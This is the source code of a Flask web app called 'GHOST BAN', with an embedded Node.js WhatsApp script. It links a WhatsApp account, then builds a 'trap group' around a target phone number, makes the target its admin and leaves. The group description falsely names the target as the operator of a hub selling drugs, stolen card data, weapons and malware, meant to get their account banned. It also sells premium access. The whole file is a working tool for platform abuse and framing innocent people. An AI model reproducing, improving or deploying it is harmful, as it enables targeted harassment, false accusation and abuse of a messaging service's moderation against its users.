import subprocess
import os
import time
import re
import threading
import json
from flask import Flask, render_template_string, request

app = Flask(__name__)

# Store active processes and connections
active_processes = {}
active_connections = {}

# ========== ACCESS KEY ==========
ACCESS_KEY = os.environ.get('ACCESS_KEY', 'GHOST-BAN-2026')

# ========== GROUP DESCRIPTION ==========
GROUP_DESCRIPTION = """⚠️ **RESTRICTED NODE: ILLEGAL EXCHANGE HUB** ⚠️

💀 **HEADQUARTERS FOR PROHIBITED SERVICES** 💀

📦 **NARCOTICS & CONTROLLED SUBSTANCES:** Global distribution of non-cleared pharmaceuticals, research chemicals, and high-grade narcotics. Direct drop-shipping for prohibited inventory.

💳 **FINANCIAL FRAUD & CARDING:** Verified bank logs (BofA, Chase, Wells Fargo) with high balances. Fullz, CC dumps with pins, and unauthorized wire transfer protocols. NO-KYC crypto laundering services available.

🔫 **RESTRICTED ARMS & BALLISTICS:** Unregistered hardware, modified ballistics, and tactical equipment procurement. Stealth shipping guaranteed through secure channels.

🔐 **DATA LEAKS & CYBER EXPLOITS:** Access to hijacked government databases, corporate espionage tools, and premium malware/ransomware distribution. Social engineering toolkits for unauthorized credential harvesting.

👤 **PRIMARY OPERATOR:** {target}

⚡ **NOTICE:** THIS GROUP OPERATES OUTSIDE INTERNATIONAL LAW. BY REMAINING IN THIS CHAT, YOU ARE COMPLICIT IN THE DISTRIBUTION OF PROHIBITED ASSETS. ALL TRADES ARE NON-REFUNDABLE."""

# ========== PREMIUM DATABASE ==========
PREMIUM_DB_PATH = os.path.join(os.path.dirname(__file__), 'premium.json')

def load_premium_db():
    if not os.path.exists(PREMIUM_DB_PATH):
        return {"premium": [], "resellers": []}
    try:
        with open(PREMIUM_DB_PATH, 'r') as f:
            return json.load(f)
    except:
        return {"premium": [], "resellers": []}

def save_premium_db(data):
    with open(PREMIUM_DB_PATH, 'w') as f:
        json.dump(data, f, indent=2)

def add_premium(user_id):
    db = load_premium_db()
    uid = str(user_id)
    if uid not in db["premium"]:
        db["premium"].append(uid)
        save_premium_db(db)
        return True
    return False

def remove_premium(user_id):
    db = load_premium_db()
    uid = str(user_id)
    if uid in db["premium"]:
        db["premium"].remove(uid)
        save_premium_db(db)
        return True
    return False

def get_premium_list():
    return load_premium_db()["premium"]

# ========== PAIRING CODE EXTRACTION ==========
def extract_pairing_code(line):
    match = re.search(r'ANON_CODE_START:([A-Z0-9]+):ANON_CODE_END', line)
    if match:
        return match.group(1)
    return None

# ========== RUN PAIRING PROCESS ==========
def run_pairing_process(number, session_id):
    """Run pair.js and keep it alive for linking to complete"""
    script_path = 'pair.js'
    
    if not os.path.exists(script_path):
        return None, "pair.js not found"
    
    try:
        subprocess.run(['pkill', '-f', f'node.*{number}'], stderr=subprocess.DEVNULL)
        time.sleep(1)
        
        print(f"[{session_id}] Starting pair.js for {number}")
        
        formatted_number = number if number.startswith('+') else '+' + number
        
        process = subprocess.Popen(
            ['node', script_path, formatted_number],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        active_processes[session_id] = {
            'process': process,
            'number': number,
            'code': None,
            'logs': [],
            'linked': False
        }
        
        for line in iter(process.stdout.readline, ''):
            line = line.strip()
            if not line:
                continue
                
            print(f"[{session_id}] {line}")
            active_processes[session_id]['logs'].append(line)
            
            if len(active_processes[session_id]['logs']) > 20:
                active_processes[session_id]['logs'].pop(0)
            
            if not active_processes[session_id]['code']:
                code = extract_pairing_code(line)
                if code:
                    active_processes[session_id]['code'] = code
                    print(f"[{session_id}] Code found: {code}")
            
            if "SUCCESS: DEVICE LINKED" in line or "DEVICE LINKED" in line:
                active_processes[session_id]['linked'] = True
                active_connections[number] = True
                print(f"[{session_id}] Device linked!")
            
            if "Logged out" in line or "authentication failed" in line:
                print(f"[{session_id}] Linking failed")
                break
        
        try:
            process.wait(timeout=120)
        except subprocess.TimeoutExpired:
            print(f"[{session_id}] Timeout, terminating...")
            process.terminate()
            process.wait(timeout=5)
            
    except Exception as e:
        print(f"[{session_id}] Error: {str(e)}")
    finally:
        if session_id in active_processes:
            del active_processes[session_id]

# ========== BAN FUNCTION ==========
def execute_ban(target_number):
    """Execute ban by creating trap group using Node.js"""
    if not active_connections:
        return False, "No WhatsApp connection. Pair first."
    
    connected_number = list(active_connections.keys())[0]
    
    # Create ban script
    ban_script = f'''
const {{ default: makeWASocket, useMultiFileAuthState, delay }} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");

async function ban() {{
    const sessionPath = './session_new';
    const {{ state, saveCreds }} = await useMultiFileAuthState(sessionPath);
    
    const sock = makeWASocket({{
        auth: state,
        logger: pino({{ level: "silent" }}),
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    }});
    
    sock.ev.on("creds.update", saveCreds);
    
    sock.ev.on("connection.update", async (update) => {{
        const {{ connection }} = update;
        
        if (connection === "open") {{
            console.log("[✓] Connected for ban");
            
            const targetJid = "{target_number}" + "@s.whatsapp.net";
            const botJid = sock.user.id;
            
            // Create group
            const group = await sock.groupCreate("GHOST BAN TRAP", [botJid, targetJid]);
            const groupJid = group.id;
            console.log("[✓] Group created: " + groupJid);
            
            await delay(2000);
            
            // Promote target
            await sock.groupParticipantsUpdate(groupJid, [targetJid], "promote");
            console.log("[✓] Target promoted");
            
            await delay(1500);
            
            // Demote bot
            await sock.groupParticipantsUpdate(groupJid, [botJid], "demote");
            console.log("[✓] Bot demoted");
            
            await delay(1500);
            
            // Update description
            const desc = `{GROUP_DESCRIPTION.replace('{target}', target_number)}`;
            await sock.groupUpdateDescription(groupJid, desc);
            console.log("[✓] Description updated");
            
            await delay(1500);
            
            // Update profile picture if exists
            if (fs.existsSync("ghost_ban_profile.jpg")) {{
    const sharp = require("sharp");
    const picBuffer = await sharp("ghost_ban_profile.jpg")
        .resize(640, 640, {{ fit: 'cover', position: 'center' }})
        .jpeg({{ quality: 80 }})
        .toBuffer();
    await sock.updateProfilePicture(groupJid, picBuffer);
    console.log("[✓] Profile picture updated");
}}
            
            await delay(1500);
            
            // Leave group
            await sock.groupLeave(groupJid);
            console.log("[✓] Bot left group");
            console.log("BAN_COMPLETE");
            
            process.exit(0);
        }}
    }});
}}

ban();
'''
    
    with open('ban-temp.js', 'w') as f:
        f.write(ban_script)
    
    try:
        result = subprocess.run(
            ['node', 'ban-temp.js'],
            capture_output=True,
            text=True,
            timeout=60
        )
        
        output = result.stdout + result.stderr
        
        if "BAN_COMPLETE" in output:
            return True, "Trap group created successfully"
        else:
            return False, f"Ban failed: {output[-500:]}"
            
    except subprocess.TimeoutExpired:
        return False, "Ban timeout"
    except Exception as e:
        return False, str(e)
    finally:
        if os.path.exists('ban-temp.js'):
            os.remove('ban-temp.js')

# ========== HTML TEMPLATE ==========
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>☠️ GHOST BAN ☠️</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #ff0000; font-family: 'Share Tech Mono', monospace; min-height: 100vh; overflow-x: hidden; position: relative; }
        body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(255,0,0,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,0,0.03) 1px, transparent 1px); background-size: 50px 50px; pointer-events: none; z-index: 0; }
        body::after { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15), rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px); pointer-events: none; z-index: 1000; animation: scanline 8s linear infinite; }
        @keyframes scanline { 0% { transform: translateY(0); } 100% { transform: translateY(100vh); } }
        .container { max-width: 900px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }
        .header { text-align: center; padding: 40px 0; border-bottom: 2px solid #ff0000; margin-bottom: 30px; position: relative; }
        .header::before, .header::after { content: '☠️'; position: absolute; top: 50%; transform: translateY(-50%); font-size: 40px; animation: flicker 2s infinite; }
        .header::before { left: 20px; } .header::after { right: 20px; }
        @keyframes flicker { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .title { font-family: 'Orbitron', sans-serif; font-size: 48px; font-weight: 900; text-transform: uppercase; letter-spacing: 10px; text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 80px #ff0000; animation: glitch 3s infinite; }
        @keyframes glitch { 0%, 90%, 100% { transform: translate(0); } 92% { transform: translate(-2px, 2px); } 94% { transform: translate(2px, -2px); } 96% { transform: translate(-2px, -2px); } 98% { transform: translate(2px, 2px); } }
        .subtitle { font-size: 14px; color: #ff3333; margin-top: 10px; letter-spacing: 5px; text-transform: uppercase; }
        .gateway { background: rgba(255,0,0,0.05); border: 1px solid #ff0000; border-radius: 10px; padding: 40px; text-align: center; margin-bottom: 30px; box-shadow: 0 0 30px rgba(255,0,0,0.2); backdrop-filter: blur(10px); }
        .gateway-title { font-family: 'Orbitron', sans-serif; font-size: 24px; margin-bottom: 20px; text-shadow: 0 0 10px #ff0000; }
        .input-group { margin: 20px 0; }
        .input-group input { width: 100%; max-width: 400px; padding: 15px 20px; background: rgba(0,0,0,0.8); border: 2px solid #ff0000; border-radius: 5px; color: #ff0000; font-family: 'Share Tech Mono', monospace; font-size: 16px; letter-spacing: 3px; text-align: center; outline: none; transition: all 0.3s; }
        .input-group input:focus { box-shadow: 0 0 20px rgba(255,0,0,0.5); border-color: #ff3333; }
        .input-group input::placeholder { color: #660000; }
        .btn { padding: 15px 40px; background: transparent; border: 2px solid #ff0000; color: #ff0000; font-family: 'Orbitron', sans-serif; font-size: 16px; font-weight: 700; text-transform: uppercase; letter-spacing: 3px; cursor: pointer; transition: all 0.3s; margin: 10px; position: relative; overflow: hidden; }
        .btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,0,0,0.3), transparent); transition: left 0.5s; }
        .btn:hover::before { left: 100%; }
        .btn:hover { background: rgba(255,0,0,0.2); box-shadow: 0 0 30px rgba(255,0,0,0.5); transform: translateY(-2px); }
        .btn:active { transform: translateY(0); }
        .dashboard { display: none; }
        .panel { background: rgba(255,0,0,0.03); border: 1px solid #ff0000; border-radius: 10px; padding: 30px; margin-bottom: 20px; box-shadow: 0 0 20px rgba(255,0,0,0.1); }
        .panel-title { font-family: 'Orbitron', sans-serif; font-size: 20px; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid #ff0000; text-shadow: 0 0 10px #ff0000; }
        .status-bar { display: flex; justify-content: space-between; flex-wrap: wrap; gap: 15px; margin-bottom: 20px; }
        .status-item { background: rgba(0,0,0,0.5); border: 1px solid #ff0000; border-radius: 5px; padding: 15px 20px; min-width: 150px; text-align: center; }
        .status-label { font-size: 12px; color: #ff3333; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px; }
        .status-value { font-family: 'Orbitron', sans-serif; font-size: 24px; font-weight: 700; text-shadow: 0 0 10px #ff0000; }
        .log-box { background: rgba(0,0,0,0.8); border: 1px solid #ff0000; border-radius: 5px; padding: 15px; height: 200px; overflow-y: auto; font-size: 12px; line-height: 1.6; }
        .log-box::-webkit-scrollbar { width: 8px; }
        .log-box::-webkit-scrollbar-track { background: #0a0a0a; }
        .log-box::-webkit-scrollbar-thumb { background: #ff0000; border-radius: 4px; }
        .log-entry { margin-bottom: 5px; padding: 3px 0; border-left: 2px solid #ff0000; padding-left: 10px; }
        .log-time { color: #ff3333; font-size: 11px; }
        .code-display { font-size: 2em; color: #00ff00; background: #0a0a0a; padding: 20px; margin: 20px 0; border: 2px solid #00ff00; border-radius: 5px; letter-spacing: 8px; font-weight: bold; text-shadow: 0 0 10px #00ff00; }
        .error { color: #ff4444; background: #1a0a0a; padding: 10px; border-radius: 5px; margin: 10px 0; }
        .success { color: #00ff88; background: #0a1a0a; padding: 10px; border-radius: 5px; margin: 10px 0; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .pulse { animation: pulse 2s infinite; }
        @media (max-width: 600px) { .title { font-size: 28px; letter-spacing: 5px; } .header::before, .header::after { display: none; } .status-bar { flex-direction: column; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="title">GHOST BAN</h1>
            <p class="subtitle">☠️ Advanced ban tool created by LORDTARRIFIC ☠️</p>
        </div>

        <div id="gateway" class="gateway">
            <div class="gateway-title">🔐 ACCESS GATEWAY</div>
            <p style="color: #ff3333; margin-bottom: 20px; font-size: 14px;">ENTER YOUR ACCESS KEY TO PROCEED</p>
            <div class="input-group">
                <input type="password" id="accessKey" placeholder="••••••••••••••••" autocomplete="off">
            </div>
            <button class="btn" onclick="login()">🔓 UNLOCK</button>
            <div id="loginError" style="color: #ff0000; margin-top: 15px; display: none; text-shadow: 0 0 10px #ff0000;">⛔ INVALID ACCESS KEY</div>
        </div>

        <div id="dashboard" class="dashboard">
            <div class="panel">
                <div class="panel-title">📊 SYSTEM STATUS</div>
                <div class="status-bar">
                    <div class="status-item">
                        <div class="status-label">Connections</div>
                        <div class="status-value" id="connCount">0</div>
                    </div>
                    <div class="status-item">
                        <div class="status-label">Uptime</div>
                        <div class="status-value" id="uptime">0m</div>
                    </div>
                    <div class="status-item">
                        <div class="status-label">Status</div>
                        <div class="status-value pulse" style="color: #00ff00; text-shadow: 0 0 10px #00ff00;">ONLINE</div>
                    </div>
                </div>
            </div>

            <div class="panel">
                <div class="panel-title">📱 PAIR WHATSAPP</div>
                <div class="input-group">
                    <input type="text" id="pairNumber" placeholder="PHONE NUMBER (e.g. 2349121747036)">
                </div>
                <button class="btn" onclick="pairWhatsApp()">🔗 GENERATE PAIRING CODE</button>
                <div id="pairResult" style="margin-top: 15px; font-size: 14px;"></div>
            </div>

            <div class="panel">
                <div class="panel-title">☠️ GHOST BAN</div>
                <div class="input-group">
                    <input type="text" id="banNumber" placeholder="TARGET NUMBER (e.g. 234712345678)">
                </div>
                <button class="btn" onclick="executeBan()">💀 EXECUTE BAN</button>
                <div id="banResult" style="margin-top: 15px; font-size: 14px;"></div>
            </div>

            <div class="panel">
                <div class="panel-title">⭐ PREMIUM MANAGEMENT</div>
                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <input type="text" id="premUserId" placeholder="USER ID" style="flex: 1; min-width: 200px; padding: 12px; background: rgba(0,0,0,0.8); border: 2px solid #ff0000; color: #ff0000; font-family: 'Share Tech Mono', monospace;">
                    <button class="btn" onclick="addPremium()">➕ ADD</button>
                    <button class="btn" onclick="delPremium()">➖ REMOVE</button>
                    <button class="btn" onclick="listPremium()">📋 LIST</button>
                </div>
                <div id="premResult" style="margin-top: 15px; font-size: 14px;"></div>
            </div>

            <div class="panel">
                <div class="panel-title">📜 ACTIVITY LOG</div>
                <div class="log-box" id="logBox">
                    <div class="log-entry"><span class="log-time">[SYSTEM]</span> GHOST BAN initialized...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let accessKey = '';
        let startTime = Date.now();

        function log(msg, type = 'info') {
            const box = document.getElementById('logBox');
            const time = new Date().toLocaleTimeString();
            const color = type === 'error' ? '#ff0000' : (type === 'success' ? '#00ff00' : '#ff3333');
            box.innerHTML += `<div class="log-entry" style="border-left-color: ${color}"><span class="log-time">[${time}]</span> ${msg}</div>`;
            box.scrollTop = box.scrollHeight;
        }

        function login() {
            const key = document.getElementById('accessKey').value.trim();
            if (!key) { document.getElementById('loginError').style.display = 'block'; return; }
            fetch('/health', { headers: { 'X-Access-Key': key } })
                .then(r => {
                    if (r.ok) {
                        accessKey = key;
                        document.getElementById('gateway').style.display = 'none';
                        document.getElementById('dashboard').style.display = 'block';
                        log('🔓 Access granted. Welcome to GHOST BAN.');
                        updateStatus();
                        setInterval(updateStatus, 30000);
                    } else { document.getElementById('loginError').style.display = 'block'; }
                })
                .catch(() => { document.getElementById('loginError').style.display = 'block'; });
        }

        function updateStatus() {
            fetch('/health', { headers: { 'X-Access-Key': accessKey } })
                .then(r => r.json())
                .then(data => {
                    document.getElementById('connCount').textContent = data.connections || 0;
                    const mins = Math.floor(data.uptime / 60);
                    document.getElementById('uptime').textContent = mins + 'm';
                })
                .catch(() => {});
        }

        function pairWhatsApp() {
            const num = document.getElementById('pairNumber').value.replace(/[^0-9]/g, '');
            if (!num) return log('❌ Enter a phone number', 'error');
            log('🔄 Requesting pairing code for ' + num + '...');
            fetch('/api/pair', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Access-Key': accessKey },
                body: JSON.stringify({ phone: num })
            })
            .then(async r => {
                if (!r.ok) { const text = await r.text(); throw new Error(`HTTP ${r.status}: ${text}`); }
                return r.json();
            })
            .then(data => {
                if (data.success) {
                    document.getElementById('pairResult').innerHTML = '<div class="code-display">' + data.pairingCode + '</div><div class="success">✅ PAIRING CODE GENERATED</div>';
                    log('✅ Pairing code generated: ' + data.pairingCode, 'success');
                } else {
                    document.getElementById('pairResult').innerHTML = '<div class="error">❌ ' + (data.error || 'Failed') + '</div>';
                    log('❌ Pairing failed: ' + (data.error || 'Unknown'), 'error');
                }
            })
            .catch(err => { log('❌ Error: ' + err.message, 'error'); });
        }

        function executeBan() {
            const num = document.getElementById('banNumber').value.replace(/[^0-9]/g, '');
            if (!num) return log('❌ Enter a target number', 'error');
            log('💀 Executing ban on ' + num + '...');
            fetch('/api/ban', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Access-Key': accessKey },
                body: JSON.stringify({ targetNumber: num })
            })
            .then(async r => {
                if (!r.ok) { const text = await r.text(); throw new Error(`HTTP ${r.status}: ${text}`); }
                return r.json();
            })
            .then(data => {
                if (data.success) {
                    document.getElementById('banResult').innerHTML = '<div class="success">✅ ' + data.message + '</div>';
                    log('✅ Ban executed: ' + data.message, 'success');
                } else {
                    document.getElementById('banResult').innerHTML = '<div class="error">❌ ' + (data.error || 'Failed') + '</div>';
                    log('❌ Ban failed: ' + (data.error || 'Unknown'), 'error');
                }
            })
            .catch(err => { log('❌ Error: ' + err.message, 'error'); });
        }

        function addPremium() {
            const uid = document.getElementById('premUserId').value.trim();
            if (!uid) return;
            fetch('/api/addprem', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Access-Key': accessKey },
                body: JSON.stringify({ userId: uid })
            })
            .then(r => r.json())
            .then(data => { log(data.message, data.success ? 'success' : 'error'); });
        }

        function delPremium() {
            const uid = document.getElementById('premUserId').value.trim();
            if (!uid) return;
            fetch('/api/delprem', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Access-Key': accessKey },
                body: JSON.stringify({ userId: uid })
            })
            .then(r => r.json())
            .then(data => { log(data.message, data.success ? 'success' : 'error'); });
        }

        function listPremium() {
            fetch('/api/listprem', { headers: { 'X-Access-Key': accessKey } })
                .then(r => r.json())
                .then(data => {
                    if (data.premium.length === 0) { log('📋 No premium users'); }
                    else { log('📋 Premium users: ' + data.premium.join(', ')); }
                });
        }

        document.getElementById('accessKey').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') login();
        });
    </script>
</body>
</html>
"""

# ========== FLASK ROUTES ==========

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/health', methods=['GET'])
def health():
    key = request.headers.get('X-Access-Key', '')
    if key != ACCESS_KEY:
        return {'error': 'Invalid access key'}, 401
    return {
        'status': 'alive',
        'uptime': time.time() - start_time,
        'connections': len(active_connections)
    }

@app.route('/api/pair', methods=['POST'])
def api_pair():
    key = request.headers.get('X-Access-Key', '')
    if key != ACCESS_KEY:
        return {'error': 'Invalid access key'}, 401
    
    data = request.get_json()
    phone = data.get('phone', '').strip()
    
    if not phone:
        return {'error': 'Number required'}, 400
    
    clean_number = re.sub(r'[^\d+]', '', phone)
    if not clean_number.startswith('+'):
        clean_number = '+' + clean_number
    
    digits_only = re.sub(r'\D', '', clean_number)
    if not digits_only or len(digits_only) < 10:
        return {'error': 'Invalid phone number'}, 400
    
    session_id = f"{clean_number}_{int(time.time())}"
    
    thread = threading.Thread(
        target=run_pairing_process, 
        args=(clean_number, session_id)
    )
    thread.daemon = True
    thread.start()
    
    waited = 0
    while waited < 15:
        if session_id in active_processes:
            code = active_processes[session_id].get('code')
            if code:
                formatted_code = '-'.join([code[i:i+4] for i in range(0, len(code), 4)])
                return {
                    'success': True,
                    'pairingCode': formatted_code,
                    'code': formatted_code
                }
        time.sleep(0.5)
        waited += 0.5
    
    return {'error': 'Timeout - no code generated'}, 500

@app.route('/api/ban', methods=['POST'])
def api_ban():
    key = request.headers.get('X-Access-Key', '')
    if key != ACCESS_KEY:
        return {'error': 'Invalid access key'}, 401
    
    data = request.get_json()
    target = data.get('targetNumber', '').strip()
    
    if not target:
        return {'error': 'Target number required'}, 400
    
    clean_target = re.sub(r'\D', '', target)
    
    success, message = execute_ban(clean_target)
    
    if success:
        return {'success': True, 'message': message}
    else:
        return {'error': message}, 500

@app.route('/api/addprem', methods=['POST'])
def api_add_premium():
    key = request.headers.get('X-Access-Key', '')
    if key != ACCESS_KEY:
        return {'error': 'Invalid access key'}, 401
    
    data = request.get_json()
    user_id = data.get('userId', '').strip()
    
    if not user_id:
        return {'error': 'User ID required'}, 400
    
    added = add_premium(user_id)
    return {
        'success': added,
        'userId': user_id,
        'message': 'Premium added' if added else 'Already premium'
    }

@app.route('/api/delprem', methods=['POST'])
def api_del_premium():
    key = request.headers.get('X-Access-Key', '')
    if key != ACCESS_KEY:
        return {'error': 'Invalid access key'}, 401
    
    data = request.get_json()
    user_id = data.get('userId', '').strip()
    
    if not user_id:
        return {'error': 'User ID required'}, 400
    
    removed = remove_premium(user_id)
    return {
        'success': removed,
        'userId': user_id,
        'message': 'Premium removed' if removed else 'Not premium'
    }

@app.route('/api/listprem', methods=['GET'])
def api_list_premium():
    key = request.headers.get('X-Access-Key', '')
    if key != ACCESS_KEY:
        return {'error': 'Invalid access key'}, 401
    
    return {'premium': get_premium_list()}

# Start time for uptime
start_time = time.time()

# Port for Render
port = int(os.environ.get("PORT", 10000))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=port)
